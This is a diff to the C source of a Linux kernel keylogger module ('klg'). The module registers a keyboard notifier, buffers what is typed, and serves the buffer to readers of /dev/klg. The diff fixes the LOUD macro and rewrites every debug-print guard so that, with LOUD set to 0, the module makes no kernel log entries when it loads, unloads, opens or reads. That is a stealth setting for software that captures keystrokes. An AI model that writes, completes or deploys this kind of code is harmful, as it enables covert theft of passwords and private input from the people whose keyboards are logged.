@@ -4,7 +4,7 @@
 #include <asm/uaccess.h>
 
 #include "klogger.h"
-#define LOUD 0;
+#define LOUD 0
 int klg_init(void) {
 	int result;
 
@@ -16,7 +16,7 @@ int klg_init(void) {
 
 	register_keyboard_notifier(&nb);
 	memset(buffer, 0, sizeof buffer);
-	#if(LOUD == 1)
+	#if(LOUD > 0)
 	printk(KERN_DEBUG "[Key logger]: Inserting klg module\n"); 
 	#endif
 	return 0;
@@ -30,14 +30,14 @@ void klg_exit(void) {
 	memset(buffer, 0, sizeof buffer);
 	bptr = buffer;
 
-	#if(LOUD == 1)
+	#if(LOUD > 0)
 	printk(KERN_DEBUG "[Key logger]: Removing klg module\n");
 	#endif
 }
 
 int klg_open(struct inode *inode, struct file *filp) {
 	
-	#if(LOUD == 1)
+	#if(LOUD > 0)
 	printk(KERN_DEBUG "[Key logger]: Opening device\n");
 	#endif
 	return 0;
@@ -45,7 +45,7 @@ int klg_open(struct inode *inode, struct file *filp) {
 
 ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) { 
 
-	#if(LOUD == 1)
+	#if(LOUD > 0)
 	printk(KERN_DEBUG "[Key logger]: Reading /dev/klg\n");
 	#endif
 
@@ -57,7 +57,7 @@ ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_po
 		p++;
 	}
 
-	#if(LOUD == 1)
+	#if(LOUD > 0)
 	printk(KERN_DEBUG "[Key logger]: Reading %d bytes\n", bytes);
 	#endif
 	if(bytes == 0 || *f_pos) return 0;
@@ -66,7 +66,7 @@ ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_po
 
 	if(ret) {
 		
-		#if(LOUD == 1)
+		#if(LOUD > 0)
 		printk(KERN_DEBUG "[Key logger]: Can't copy to user space buffer\n");
 		#endif
 		return -EFAULT;
